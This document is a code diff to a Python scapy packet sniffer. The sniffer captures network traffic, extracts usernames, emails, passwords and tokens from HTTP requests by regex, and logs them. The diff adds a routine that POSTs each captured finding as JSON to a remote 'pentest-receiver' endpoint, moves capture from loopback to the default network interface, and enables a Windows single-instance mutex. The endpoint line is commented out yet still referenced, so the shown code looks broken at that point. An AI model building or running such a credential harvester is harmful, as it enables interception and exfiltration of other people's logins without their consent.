@@ -1,10 +1,13 @@
 import ctypes
+import json
+import os
 import sys
 import time
 from scapy.all import sniff
 from datetime import datetime
 import re
 from urllib.parse import unquote_plus
+from urllib.request import Request, urlopen
 
 MUTEX_NAME = "Global\\NetworkSnifferMutex"
 
@@ -23,6 +26,7 @@ def already_running():
 LOG_FILE = "sniffer.log"
 DEDUP_WINDOW_SECONDS = 0.35
 _RECENT_LOGS = {}
+# JSON_ENDPOINT = "https://pentest-receiver-production.up.railway.app/packets/data" #this probably does not work
 
 FORM_FIELD_RE = re.compile(r"(?:^|[?&;\s])(?P<key>username|email|password|pass|pwd|token|login)=(?P<value>[^&\s]+)", re.IGNORECASE)
 JSON_FIELD_RE = re.compile(r'"(?P<key>username|email|password|pass|pwd|token|login)"\s*:\s*"(?P<value>[^"]+)"', re.IGNORECASE)
@@ -37,6 +41,52 @@ def log_line(line):
     print(line)
     with open(LOG_FILE, "a") as f:
         f.write(line + "\n")
+
+
+def parse_finding_data(finding):
+    data = {}
+    event_tokens = []
+
+    for token in finding.split():
+        if "=" in token:
+            key, value = token.split("=", 1)
+            if value.isdigit():
+                data[key] = int(value)
+                continue
+            data[key] = value
+            continue
+        event_tokens.append(token)
+
+    if event_tokens:
+        data["event"] = " ".join(event_tokens)
+
+    return data
+
+
+def build_event_json(timestamp, protocol, finding):
+    return {
+        "date": timestamp,
+        "protocol": protocol,
+        "data": parse_finding_data(finding),
+    }
+
+
+def send_event_json(event):
+    if not JSON_ENDPOINT:
+        return
+
+    try:
+        payload = json.dumps(event).encode("utf-8")
+        request = Request(
+            JSON_ENDPOINT,
+            data=payload,
+            headers={"Content-Type": "application/json"},
+            method="POST",
+        )
+        with urlopen(request, timeout=2):
+            pass
+    except Exception:
+        return
 
 
 def _is_duplicate_event(protocol, finding):
@@ -56,7 +106,10 @@ def _is_duplicate_event(protocol, finding):
 def log_protocol(timestamp, protocol, finding, dedup=False):
     if dedup and _is_duplicate_event(protocol, finding):
         return
+
+    event = build_event_json(timestamp, protocol, finding)
     log_line(f"[{timestamp}] {protocol}: {finding}")
+    send_event_json(event)
 
 
 def extract_sensitive_fields(http_text):
@@ -317,19 +370,19 @@ def packet_callback(packet):
         process_http(packet, timestamp)
 
 def main():
-    iface = "lo" # None on Windows to use default interface, "lo" for Linux loopback testing
+    iface = None # None on Windows to use default interface, "lo" for Linux loopback testing
     bpf_filter = "tcp or udp or icmp or arp"
     print(f"[*] Scapy sniffer started on iface={iface or 'default'} filter='{bpf_filter}'. Press Ctrl+C to stop.")
     sniff(iface=iface, filter=bpf_filter, prn=packet_callback, store=False)
 
 if __name__ == "__main__": 
     # uncomment the following lines on Windows
-    # if already_running():
-    #     print("Another instance of the sniffer is already running. Exiting.")
-    #     sys.exit(0)
+    if already_running():
+        print("Another instance of the sniffer is already running. Exiting.")
+        sys.exit(0)
     try:
         main()
     finally:
-        # if 'mutex_handle' in globals():
-        #     ctypes.windll.kernel32.CloseHandle(mutex_handle)
+        if 'mutex_handle' in globals():
+            ctypes.windll.kernel32.CloseHandle(mutex_handle)
         pass
